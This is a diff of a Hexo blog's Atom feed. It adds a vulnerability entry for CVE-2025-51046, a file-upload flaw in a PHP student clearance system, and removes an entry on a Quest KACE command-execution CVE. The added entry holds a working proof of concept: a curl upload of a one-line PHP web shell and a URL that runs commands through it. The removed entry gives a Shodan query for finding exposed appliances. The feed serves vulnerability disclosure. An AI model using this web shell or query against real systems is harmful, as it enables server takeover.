@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-25T18:00:19.028Z</updated>
+  <updated>2025-06-25T18:15:15.248Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SourceCodester Online Student Clearance System 10 文件上传漏洞</title>
+    <link href="http://example.com/2025/06/25/github_2558243243/"/>
+    <id>http://example.com/2025/06/25/github_2558243243/</id>
+    <published>2025-06-25T18:15:15.248Z</published>
+    <updated>2025-06-25T18:15:15.248Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> SourceCodester Online Student Clearance System 1.0 文件上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-51046</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> SourceCodester Online Student Clearance System v1.0 在 <code>edit-photo.php</code> 文件中存在一个不受限制的文件上传漏洞。应用程序未能验证或限制上传的文件类型，允许攻击者上传PHP脚本（例如，一个web shell）。该脚本存储在公开可访问的 <code>/uploads/</code> 目录中，使得远程攻击者能够在服务器上执行任意系统命令。</p><p><strong>产品厂商：</strong> SourceCodeste</p><p><strong>产品名称：</strong> Online Student Clearance System using PHP and MySQL</p><p><strong>影响版本：</strong> 1.0</p><p><strong>来源：</strong> <a href="https://github.com/0xMesh-X/CVE-2025-51046">https://github.com/0xMesh-X/CVE-2025-51046</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-51046-Remote-File-Upload-Vulnerability-in-SourceCodeste-Online-Student-Clearance-System-v1-0"><a href="#CVE-2025-51046-Remote-File-Upload-Vulnerability-in-SourceCodeste-Online-Student-Clearance-System-v1-0" class="headerlink" title="CVE-2025-51046 - Remote File Upload Vulnerability in SourceCodeste Online Student Clearance System v1.0"></a>CVE-2025-51046 - Remote File Upload Vulnerability in SourceCodeste Online Student Clearance System v1.0</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><strong>CVE ID</strong>: CVE-2025-51046<br><strong>Vendor</strong>: SourceCodeste<br><strong>Product</strong>: Online Student Clearance System using PHP and MySQL<br><strong>Version</strong>: 1.0<br><strong>Component</strong>: <code>edit-photo.php</code> file upload functionality (and the <code>/uploads/</code> directory)<br><strong>Attack Type</strong>: Remote<br><strong>Vulnerability Type</strong>: Remote File Upload (leading to Remote Code Execution)<br><strong>Discoverer</strong>: Meshari Alluhaybi</p><hr><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>SourceCodeste Online Student Clearance System v1.0 has an unrestricted file upload vulnerability in the <code>edit-photo.php</code> file. The application fails to validate or restrict uploaded file types, allowing an attacker to upload a PHP script (e.g., a web shell). The script is stored in the publicly accessible <code>/uploads/</code> directory, enabling remote attackers to execute arbitrary system commands on the server.</p><hr><h3 id="Attack-Vectors"><a href="#Attack-Vectors" class="headerlink" title="Attack Vectors"></a>Attack Vectors</h3><p>An attacker can exploit this vulnerability by uploading a malicious PHP file via the file upload functionality in <code>edit-photo.php</code>. Due to lack of proper file type restrictions and sanitization, the malicious file is stored in <code>/uploads/</code> where it can be directly accessed and executed.</p><hr><h3 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h3><h4 id="1-Upload-the-Web-Shell"><a href="#1-Upload-the-Web-Shell" class="headerlink" title="1. Upload the Web Shell"></a>1. Upload the Web Shell</h4><p>curl -F “userImage&#x3D;@shell.php;type&#x3D;application&#x2F;x-php” -F “btnedit&#x3D;” <a href="http://192.168.8.138/edit-photo.php">http://192.168.8.138/edit-photo.php</a></p><p><strong>Contents of <code>shell.php</code>:</strong></p><?php system($_GET['cmd']); ?><h4 id="2-Execute-Remote-Commands"><a href="#2-Execute-Remote-Commands" class="headerlink" title="2. Execute Remote Commands"></a>2. Execute Remote Commands</h4><p>Access the uploaded shell:</p><p><a href="http://192.168.8.138/uploads/shell.php?cmd=id">http://192.168.8.138/uploads/shell.php?cmd=id</a></p><p>This command will execute the <code>id</code> command on the server, proving remote code execution.</p><hr><h3 id="Affected-Product-Details"><a href="#Affected-Product-Details" class="headerlink" title="Affected Product Details"></a>Affected Product Details</h3><ul><li><strong>Vendor</strong>: SourceCodeste</li><li><strong>Product</strong>: Online Student Clearance System using PHP and MySQL</li><li><strong>Version</strong>: 1.0</li><li><strong>Component</strong>: <code>edit-photo.php</code> (file upload functionality) and <code>/uploads/</code> directory</li></ul><hr><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><ul><li>Full remote code execution on the server</li><li>Potential system compromise and privilege escalation</li><li>Unauthorized manipulation of the web application</li></ul><hr><h3 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h3><ul><li><strong>File Upload Restrictions</strong>: Enforce strict file extension whitelisting (e.g., allow only <code>.jpg</code>, <code>.png</code>).</li><li><strong>MIME Type Verification</strong>: Check MIME types on the server side to ensure files match allowed types.</li><li><strong>Storage Location</strong>: Store uploaded files outside the web root to prevent direct access.</li><li><strong>File Renaming</strong>: Rename uploaded files and remove original extensions to reduce risk.</li></ul><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="http://sourcecodester.com/">SourceCodester</a></li><li><a href="http://online.com/">Online Student Clearance System</a></li></ul><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; SourceCodester Online Student Clearance</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+  </entry>
   
   <entry>
     <title>Achat 0150 beta7 Buffer Overflow Vulnerability</title>
@@ -518,32 +544,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Quest KACE System Management Appliance 任意命令执行漏洞</title>
-    <link href="http://example.com/2025/06/25/github_1057633275/"/>
-    <id>http://example.com/2025/06/25/github_1057633275/</id>
-    <published>2025-06-25T11:00:18.957Z</published>
-    <updated>2025-06-25T11:00:18.952Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE System Management Appliance 任意命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11138</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Quest KACE System Management Appliance 8.0.318中的’&#x2F;common&#x2F;download_agent_installer.php’脚本允许匿名用户访问，可被滥用以在系统上执行任意命令。</p><p><strong>产品厂商：</strong> Quest</p><p><strong>产品名称：</strong> KACE System Management Appliance</p><p><strong>影响版本：</strong> 8.0.318</p><p><strong>搜索语法：</strong> http.title:”kace systems management”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12468">https://github.com/projectdiscovery/nuclei-templates/issues/12468</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>The ‘&#x2F;common&#x2F;download_agent_installer.php’ script in the Quest KACE System Management Appliance 8.0.318 is accessible by anonymous users and can be abused to execute arbitrary commands on the system.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities">https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities</a></li><li><a href="https://www.exploit-db.com/exploits/44950/">https://www.exploit-db.com/exploits/44950/</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-kace-systems-management"><a href="#Shodan-Query-http-title-kace-systems-management" class="headerlink" title="Shodan Query: http.title:&quot;kace systems management&quot;"></a>Shodan Query: <code>http.title:&quot;kace systems management&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Quest KACE System Management Appliance </summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
